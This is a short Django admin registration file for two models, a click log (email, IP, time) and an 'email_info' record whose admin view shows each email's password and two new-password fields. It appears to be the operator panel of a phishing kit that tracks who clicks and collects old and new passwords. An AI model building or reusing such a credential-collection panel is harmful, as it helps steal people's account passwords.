from django.contrib import admin

# Register your models here.
from .models import click, email_info


class clickAdmin(admin.ModelAdmin):
    list_display = ['email', 'ip', 'created_at']
    search_fields = ['email']


admin.site.register(click, clickAdmin)


class email_infoAdmin(admin.ModelAdmin):
    list_display = ['email', 'password', 'new_password1', 'new_password2', 'created_at', 'updated_at']
    search_fields = ['email']


admin.site.register(email_info, email_infoAdmin)